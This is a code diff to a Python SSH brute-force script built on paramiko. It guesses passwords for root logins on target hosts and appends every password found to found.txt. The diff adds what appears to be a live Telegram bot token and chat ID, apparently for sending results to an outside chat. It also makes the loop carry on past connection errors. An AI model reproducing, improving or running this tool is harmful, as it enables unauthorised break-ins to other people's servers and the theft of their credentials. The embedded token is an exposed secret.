@@ -7,8 +7,8 @@ import time
 import requests
 
 
-token = 'tok'
-chat_id = 'id'
+token = '1104116364:AAHV99ycPwTOGBSBVSheBHwA3ZV4PRtt_4Y'
+chat_id = '-1001574358576'
 
 
 
@@ -39,7 +39,7 @@ def brute(host, passwordsed):
         except paramiko.AuthenticationException:
             print(f'[!] Password Incorrect: {host} ' + password)
         except Exception:
-            break
+            pass
         else:
             print(f'[+] Password Found: {host} ' + password)
             open('found.txt', 'a').write(host + ' ' + password + ' root'+'\n')
